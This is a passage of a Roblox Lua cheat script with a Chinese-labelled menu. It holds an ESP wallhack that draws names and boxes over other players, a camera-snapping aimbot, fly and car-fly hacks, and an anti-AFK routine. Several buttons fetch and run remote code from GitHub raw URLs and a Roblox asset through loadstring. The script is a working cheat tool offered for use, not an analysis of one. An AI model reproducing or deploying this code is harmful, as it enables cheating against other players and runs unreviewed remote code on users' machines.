	if _G.CircleVisible == false then
		_G.CircleVisible = true
		NameTogle.Image = "http://www.roblox.com/asset/?id=1264515756"
	else do
		_G.CircleVisible = false
		NameTogle.Image = "http://www.roblox.com/asset/?id=1264513374"
			
		end
	end
end)

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local esp = Instance.new("BillboardGui")
local name = Instance.new("TextLabel")
local mainesp = Instance.new("BillboardGui")
local box = Instance.new("ImageLabel")
local LocalPlayer = Players.LocalPlayer

esp.Name = "esp" 
esp.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
esp.Active = true
esp.AlwaysOnTop = true
esp.LightInfluence = 1.000
esp.Size = UDim2.new(0, 300, 0, 30)
esp.StudsOffset = Vector3.new(0, 3, 0)

name.Name = "name"
name.Parent = esp
name.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
name.BackgroundTransparency = 1.000
name.BorderColor3 = Color3.fromRGB(0, 0, 0)
name.BorderSizePixel = 0
name.Size = UDim2.new(1, 0, 1, 0)
name.Font = Enum.Font.Ubuntu
name.TextColor3 = Color3.fromRGB(93, 255, 255)
name.TextScaled = false
name.TextSize = 9.000
name.TextStrokeTransparency = 0.000
name.TextWrapped = true
name.TextTransparency = 1

mainesp.Name = "mainesp"
mainesp.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
mainesp.Active = true
mainesp.AlwaysOnTop = true
mainesp.LightInfluence = 1.000
mainesp.MaxDistance = 999999.000
mainesp.Size = UDim2.new(4, 0, 6, 0)

box.Name = "box"
box.Parent = mainesp
box.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
box.BackgroundTransparency = 1.000
box.BorderColor3 = Color3.fromRGB(0, 0, 0)
box.BorderSizePixel = 0
box.Size = UDim2.new(1, 0, 1, 0)
box.Image = "http://www.roblox.com/asset/?id=16946608585"
box.ImageTransparency = 1

RunService.RenderStepped:Connect(function()
	for i, v in pairs(Players:GetChildren()) do
		local sigma = Players.LocalPlayer
		if not v.Character.Head:FindFirstChild("esp") then
			if v ~= game.Players.LocalPlayer then
			    local sigma = Players.LocalPlayer
				local nameClone = esp:Clone()
				local espClone = mainesp:Clone()
				nameClone.Parent = v.Character:FindFirstChild("Head")
				nameClone:FindFirstChild("name").Text = nameClone.Parent.Parent.Name
				espClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
			end

		end

	end
end)

Players.PlayerAdded:Connect(function(player)
	local sigma = Players.LocalPlayer
	if not player.Character.Head:FindFirstChild("esp") then
		if player ~= game.Players.LocalPlayer then
		    local sigma = Players.LocalPlayer
			local nameClone = esp:Clone()
			local espClone = mainesp:Clone()
			nameClone.Parent = player.Character:FindFirstChild("Head")
			nameClone:FindFirstChild("name").Text = nameClone.Parent.Parent.Name
			wait(1)
			espClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
			 end

	end
end)

RunService.RenderStepped:Connect(function()
    for i, v in pairs(Players:GetChildren()) do
		local me = Players.LocalPlayer
		if activated == true then
		if v ~= me then
			if v.Team == me.Team then
				if v.Character.Head:FindFirstChild("esp") then
				v.Character.Head:FindFirstChild("esp"):Destroy()
				v.Character.HumanoidRootPart:FindFirstChild("mainesp"):Destroy()
				end
			end
		end
		end
	end
end)

Players.PlayerAdded:Connect(function(player)
    local me = Players.LocalPlayer
	if player ~= me then
		if activated == true then
	if player.Team == me.Team then
		if player.Character.Head:FindFirstChild("esp") then
		player.Character.Head:FindFirstChild("esp"):Destroy()
		player.Character.HumanoidRootPart:FindFirstChild("mainesp"):Destroy()
		end
	end
	end
	end
end)

RunService.RenderStepped:Connect(function()
	for i, v in pairs(Players:GetChildren()) do
		if toggled == true then
			if v.Character.Head:FindFirstChild("esp") then
				if v.Character.HumanoidRootPart:FindFirstChild("mainesp") then
				v.Character.Head:FindFirstChild("esp").name.TextTransparency = 0
				v.Character.HumanoidRootPart:FindFirstChild("mainesp").box.ImageTransparency = 0.43
				end
			end
		else do
			if v.Character.Head:FindFirstChild("esp") then
				if v.Character.HumanoidRootPart:FindFirstChild("mainesp") then
			v.Character.Head:FindFirstChild("esp").name.TextTransparency = 1
			v.Character.HumanoidRootPart:FindFirstChild("mainesp").box.ImageTransparency = 1
				end
			end
	end
		end
	end
end)

local Holding = false

local FovCircle = Drawing.new("Circle")
FovCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
FovCircle.Radius = _G.sizeof
FovCircle.Color = _G.CircleColor
FovCircle.Visible = _G.CircleVisible
FovCircle.NumSides = _G.CircleSides
FovCircle.Filled = false
FovCircle.Transparency = _G.fovTransparency
FovCircle.Thickness = 0

local function GetClosestPlayer()
	local Target = nil
	local MaxDistance = _G.sizeof

	for i, v in next, Players:GetChildren() do
		if v.Name ~= LocalPlayer.Name then
			if _G.TeamCheckOn == true then
				if v.Team ~= LocalPlayer.Team then
					if v.Character ~= nil then
						if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
							if v.Character:FindFirstChild("Humanoid") ~= nil then
								if v.Character:FindFirstChild("Humanoid").Health ~= 0 then
								local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
								local VectorDistance = (Vector2.new(uis:GetMouseLocation().X, uis:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude

								if VectorDistance < MaxDistance then
									Target = v
								end
								end
							end
						end
					end
				end
			else
				if v.Character ~= nil then
					if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
						if v.Character:FindFirstChild("Humanoid") ~= nil then
							if v.Character:FindFirstChild("Humanoid").Health ~= 0 then
							local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
							local VectorDistance = (Vector2.new(uis:GetMouseLocation().X, uis:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude

							if VectorDistance < MaxDistance then
								Target = v
							end
							end
						end
					end
			end
		end
	end
end

return Target
end

uis.InputBegan:Connect(function(Input)
	if Input.UserInputType == Enum.UserInputType.MouseButton2 then
		Holding = true
	end
end)

uis.InputEnded:Connect(function(Input)
	if Input.UserInputType == Enum.UserInputType.MouseButton2 then
		Holding = false
	end
end)

RunService.RenderStepped:Connect(function ()
	FovCircle.Position = Vector2.new(uis:GetMouseLocation().X, uis:GetMouseLocation().Y)
    FovCircle.Radius = _G.sizeof
    FovCircle.Color = _G.CircleColor
    FovCircle.Visible = _G.CircleVisible
    FovCircle.NumSides = _G.CircleSides
    FovCircle.Filled = false
    FovCircle.Transparency = _G.fovTransparency
    FovCircle.Thickness = 0

	if Holding == true and AimOn == true then
		ts:Create(Camera, TweenInfo.new(_G.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, GetClosestPlayer().Character[_G.Aimpart].Position)}):Play()

	end
end) 

  	end    

})

local Tab = Window:MakeTab({

    Name = "内存后台",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "提升流畅",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/FPS-X-GUI/main/FPS_X.lua"))()

  	end    

})

Tab:AddButton({

	Name = "高清光影 ",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()

  	end    

})

Tab:AddButton({

	Name = "车子飞天",

	Callback = function()

     local Speed = 30

	-- Gui to Lua
	-- Version: 3.2
	local HumanoidRP = game.Players.LocalPlayer.Character.HumanoidRootPart
	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local W = Instance.new("TextButton")
	local S = Instance.new("TextButton")
	local A = Instance.new("TextButton")
	local D = Instance.new("TextButton")
	local Fly = Instance.new("TextButton")
	local unfly = Instance.new("TextButton")
	local StopFly = Instance.new("TextButton")

	--Properties:

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	unfly.Name = "关闭飞行"
	unfly.Parent = ScreenGui
	unfly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	unfly.Position = UDim2.new(0.694387913, 0, 0.181818187, 0)
	unfly.Size = UDim2.new(0, 72, 0, 50)
	unfly.Font = Enum.Font.SourceSans
	unfly.Text = "关闭飞行"
	unfly.TextColor3 = Color3.fromRGB(170, 0, 255)
	unfly.TextScaled = true
	unfly.TextSize = 14.000
	unfly.TextWrapped = 
		unfly.MouseButton1Down:Connect(function()
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
	end)

	StopFly.Name = "暂停飞行"
	StopFly.Parent = ScreenGui
	StopFly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	StopFly.Position = UDim2.new(0.695689976, 0, 0.0213903747, 0)
	StopFly.Size = UDim2.new(0, 71, 0, 50)
	StopFly.Font = Enum.Font.SourceSans
	StopFly.Text = "暂停飞行"
	StopFly.TextColor3 = Color3.fromRGB(170, 0, 255)
	StopFly.TextScaled = true
	StopFly.TextSize = 14.000
	StopFly.TextWrapped = true
	StopFly.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = true
	end)

	Fly.Name = "飞行"
	Fly.Parent = ScreenGui
	Fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Fly.Position = UDim2.new(0.588797748, 0, 0.0213903747, 0)
	Fly.Size = UDim2.new(0, 66, 0, 50)
	Fly.Font = Enum.Font.SourceSans
	Fly.Text = "飞行"
	Fly.TextColor3 = Color3.fromRGB(170, 0, 127)
	Fly.TextScaled = true
	Fly.TextSize = 14.000
	Fly.TextWrapped = true
	Fly.MouseButton1Down:Connect(function()
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	end)

	W.Name = "W"
	W.Parent = ScreenGui
	W.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	W.Position = UDim2.new(0.161668837, 0, 0.601604283, 0)
	W.Size = UDim2.new(0, 58, 0, 50)
	W.Font = Enum.Font.SourceSans
	W.Text = "↑"
	W.TextColor3 = Color3.fromRGB(226, 226, 526)
	W.TextScaled = true
	W.TextSize = 5.000
	W.TextWrapped = true
	W.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 50000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * Speed
	end)


	S.Name = "S"
	S.Parent = ScreenGui
	S.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	S.Position = UDim2.new(0.161668837, 0, 0.735294104, 0)
	S.Size = UDim2.new(0, 58, 0, 50)
	S.Font = Enum.Font.SourceSans
	S.Text = "↓"
	S.TextColor3 = Color3.fromRGB(255, 255, 255)
	S.TextScaled = true
	S.TextSize = 14.000
	S.TextWrapped = true
	S.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * -Speed
	end)

  	end    

})

Tab:AddButton({

	Name = "防止掉线",

	Callback = function()

     	print("Anti Afk On")

		local vu = game:GetService("VirtualUser")

		game:GetService("Players").LocalPlayer.Idled:connect(function()

		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		   wait(1)

		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		end)

  	end    

})

Tab:AddButton({

	Name = "人物飞行",

	Callback = function()

     local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local up = Instance.new("TextButton")
local down = Instance.new("TextButton")
local onof = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local plus = Instance.new("TextButton")
local speed = Instance.new("TextLabel")
local mine = Instance.new("TextButton")
local closebutton = Instance.new("TextButton")
local mini = Instance.new("TextButton")
local mini2 = Instance.new("TextButton")

main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
main.ResetOnSpawn = false

Frame.Parent = main
Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "up"
up.Parent = Frame
up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
up.Size = UDim2.new(0, 44, 0, 28)
up.Font = Enum.Font.SourceSans
up.Text = "上升♂"
up.TextColor3 = Color3.fromRGB(0, 0, 0)
up.TextSize = 14.000

down.Name = "down"
down.Parent = Frame
down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
down.Position = UDim2.new(0, 0, 0.491228074, 0)
down.Size = UDim2.new(0, 44, 0, 28)
down.Font = Enum.Font.SourceSans
down.Text = "下落♂"
down.TextColor3 = Color3.fromRGB(0, 0, 0)
down.TextSize = 14.000

onof.Name = "onof"
onof.Parent = Frame
onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
onof.Size = UDim2.new(0, 56, 0, 28)
onof.Font = Enum.Font.SourceSans
onof.Text = "飞行♂"
onof.TextColor3 = Color3.fromRGB(0, 0, 0)
onof.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "SASPOL汉化♂"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

plus.Name = "plus"
plus.Parent = Frame
plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
plus.Position = UDim2.new(0.231578946, 0, 0, 0)
plus.Size = UDim2.new(0, 45, 0, 28)
plus.Font = Enum.Font.SourceSans
plus.Text = "+"
plus.TextColor3 = Color3.fromRGB(0, 0, 0)
plus.TextScaled = true
plus.TextSize = 14.000
plus.TextWrapped = true

speed.Name = "speed"
speed.Parent = Frame
speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
speed.Size = UDim2.new(0, 44, 0, 28)
speed.Font = Enum.Font.SourceSans
speed.Text = "1"
speed.TextColor3 = Color3.fromRGB(0, 0, 0)
speed.TextScaled = true
speed.TextSize = 14.000
speed.TextWrapped = true

mine.Name = "mine"
mine.Parent = Frame
mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
mine.Size = UDim2.new(0, 45, 0, 29)
mine.Font = Enum.Font.SourceSans
mine.Text = "-"
mine.TextColor3 = Color3.fromRGB(0, 0, 0)
mine.TextScaled = true
mine.TextSize = 14.000
mine.TextWrapped = true

closebutton.Name = "Close"
closebutton.Parent = main.Frame
closebutton.BackgroundColor3 = Color3.fromRGB(225, 25, 0)
closebutton.Font = "SourceSans"
closebutton.Size = UDim2.new(0, 45, 0, 28)
closebutton.Text = "X"
closebutton.TextSize = 30
closebutton.Position =  UDim2.new(0, 0, -1, 27)

mini.Name = "minimize"
mini.Parent = main.Frame
mini.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini.Font = "SourceSans"
mini.Size = UDim2.new(0, 45, 0, 28)
mini.Text = "-"
mini.TextSize = 40
mini.Position = UDim2.new(0, 44, -1, 27)

mini2.Name = "minimize2"
mini2.Parent = main.Frame
mini2.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini2.Font = "SourceSans"
mini2.Size = UDim2.new(0, 45, 0, 28)
mini2.Text = "+"
mini2.TextSize = 40
mini2.Position = UDim2.new(0, 44, -1, 57)
mini2.Visible = false

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Fly GUI V3";
	Text = "By me_ozone and Quandale The Dinglish XII#3550";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 5;

Frame.Active = true -- main = gui
Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then



		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			game:GetService("RunService").RenderStepped:Wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end
			--	game.Players.LocalPlayer.Character.Animate.Disabled = true
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false




	else
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.UpperTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false



	end





end)

local tis

up.MouseButton1Down:connect(function()
	tis = up.MouseEnter:connect(function()
		while tis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
		end
	end)
end)

up.MouseLeave:connect(function()
	if tis then
		tis:Disconnect()
		tis = nil
	end
end)

local dis

down.MouseButton1Down:connect(function()
	dis = down.MouseEnter:connect(function()
		while dis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
		end
	end)
end)

down.MouseLeave:connect(function()
	if dis then
		dis:Disconnect()
		dis = nil
	end
end)


game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
	wait(0.7)
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)


plus.MouseButton1Down:connect(function()
	speeds = speeds + 1
	speed.Text = speeds
	if nowe == true then


		tpwalking = false
		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
	end
end)
mine.MouseButton1Down:connect(function()
	if speeds == 1 then
		speed.Text = 'cannot be less than 1'
		wait(1)
		speed.Text = speeds
	else
		speeds = speeds - 1
		speed.Text = speeds
		if nowe == true then
			tpwalking = false
			for i = 1, speeds do
				spawn(function()

					local hb = game:GetService("RunService").Heartbeat	


					tpwalking = true
					local chr = game.Players.LocalPlayer.Character
					local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
					while tpwalking and hb:Wait() and chr and hum and hum.Parent do
						if hum.MoveDirection.Magnitude > 0 then
							chr:TranslateBy(hum.MoveDirection)
						end
					end

				end)
			end
		end
	end
end)

closebutton.MouseButton1Click:Connect(function()
	main:Destroy()
end)

mini.MouseButton1Click:Connect(function()
	up.Visible = false
	down.Visible = false
	onof.Visible = false
	plus.Visible = false
	speed.Visible = false
	mine.Visible = false
	mini.Visible = false
	mini2.Visible = true
	main.Frame.BackgroundTransparency = 1
	closebutton.Position =  UDim2.new(0, 0, -1, 57)
end)

mini2.MouseButton1Click:Connect(function()
	up.Visible = true
	down.Visible = true
	onof.Visible = true
	plus.Visible = true
	speed.Visible = true
	mine.Visible = true
	mini.Visible = true
	mini2.Visible = false
	main.Frame.BackgroundTransparency = 0 
	closebutton.Position =  UDim2.new(0, 0, -1, 27)
end)



  	end    

})

Tab:AddButton({

	Name = "分身术",

	Callback = function()

     loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)()

  	end    

})

Tab:AddButton({

	Name = "人物动作",

	Callback = function()

     local AnimationChanger = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TopBar = Instance.new("Frame")
local Close = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local NormalTab = Instance.new("Frame")
local A_Astronaut = Instance.new("TextButton")
local A_Bubbly = Instance.new("TextButton")
